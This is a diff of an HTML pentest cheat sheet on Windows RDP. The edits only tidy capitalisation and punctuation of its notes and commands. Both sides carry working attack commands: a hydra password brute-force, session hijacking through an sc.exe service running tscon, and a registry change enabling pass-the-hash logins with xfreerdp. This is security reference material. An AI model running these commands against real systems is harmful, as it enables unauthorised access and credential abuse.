@@ -50,51 +50,51 @@
     
     <h1>RDP</h1>
 
-<h2>main points</h2>
+<h2>Main points</h2>
 
 <ul>
-<li>Remote Desktop Protocol</li>
-<li>provides remote access to a computer running windows</li>
-<li>GUI encrypted over IP</li>
-<li>handles TLS/SSL for the login process since windows vista</li>
-<li>typically uses port TCP 3389, but port UDP 3389 can also be used</li>
+<li>Remote Desktop Protocol.</li>
+<li>Provides remote access to a computer running Windows.</li>
+<li>GUI encrypted over IP.</li>
+<li>Handles TLS/SSL for the login process since Windows Vista.</li>
+<li>Typically uses port TCP 3389, but port UDP 3389 can also be used.</li>
 </ul>
 
-<h2>commands</h2>
+<h2>Commands</h2>
 
-<div class="highlight"><pre class="highlight shell"><code><span class="c"># scan and enumerate RDP with nmap.</span>
-<span class="c"># be careful however, as nmap sends</span>
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># Scan and enumerate RDP with nmap.</span>
+<span class="c"># Be careful however, as nmap sends</span>
 <span class="c"># mstshash=nmap RDP cookies that can</span>
 <span class="c"># be identified by EDR, threat hunters</span>
-<span class="c"># and more.</span>
+<span class="c"># and more:</span>
 nmap <span class="nt">-sV</span> <span class="nt">-sC</span> &lt;IP address&gt; <span class="nt">-p</span> 3389 <span class="nt">--script</span> rdp<span class="k">*</span>
 
-<span class="c"># enumerate security settings of RDP with</span>
+<span class="c"># Enumerate security settings of RDP with</span>
 <span class="c"># rdp-sec-check: https://github.com/CiscoCXSecurity/rdp-sec-check</span>
 rdp-sec-check &lt;IP address&gt;
 
-<span class="c"># initiate RDP session with xfreerdp</span>
+<span class="c"># Initiate RDP session with xfreerdp:</span>
 xfreerdp /u:&lt;username&gt; /p:&lt;password&gt; /v:&lt;IP address&gt; /cert:ignore /dynamic-resolution +clipboard
 
-<span class="c"># execute a password attack with hydra</span>
+<span class="c"># Execute a password attack with hydra:</span>
 hydra <span class="nt">-V</span> <span class="nt">-L</span> &lt;username list&gt; <span class="nt">-P</span> &lt;password list&gt; rdp://&lt;IP address&gt;
 
-<span class="c"># on windows, query users with active RDP sessions</span>
+<span class="c"># On Windows, query users with active RDP sessions:</span>
 query user
 
-<span class="c"># on windows with sc.exe, create a service to hijack a RDP session</span>
+<span class="c"># On Windows with sc.exe, create a service to hijack a RDP session:</span>
 sc.exe create &lt;service name&gt; <span class="nv">binpath</span><span class="o">=</span> <span class="s2">"cmd.exe /k tscon &lt;session ID&gt; /dest:&lt;session name&gt;"</span>
 
-<span class="c"># then, start the service and hijack the session</span>
+<span class="c"># Then, start the service and hijack the session:</span>
 net start &lt;service name&gt;
 
-<span class="c"># on windows, add a registry key that enables</span>
-<span class="c"># restricted admin mode. this allows us to</span>
-<span class="c"># perform a pass the hash attack to connect</span>
-<span class="c"># with RDP</span>
+<span class="c"># On Windows, add a registry key that enables</span>
+<span class="c"># restricted admin mode. This allows us to</span>
+<span class="c"># perform a pass-the-hash attack to connect</span>
+<span class="c"># with RDP:</span>
 reg add HKLM<span class="se">\S</span>ystem<span class="se">\C</span>urrentControlSet<span class="se">\C</span>ontrol<span class="se">\L</span>sa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
 
-<span class="c"># then, use xfreerdp to pass the hash and connect</span>
+<span class="c"># Then, use xfreerdp to pass the hash and connect:</span>
 xfreerdp /v:&lt;IP address&gt; /u:&lt;username&gt; /pth:&lt;<span class="nb">hash</span><span class="o">&gt;</span>
 </code></pre></div>
 
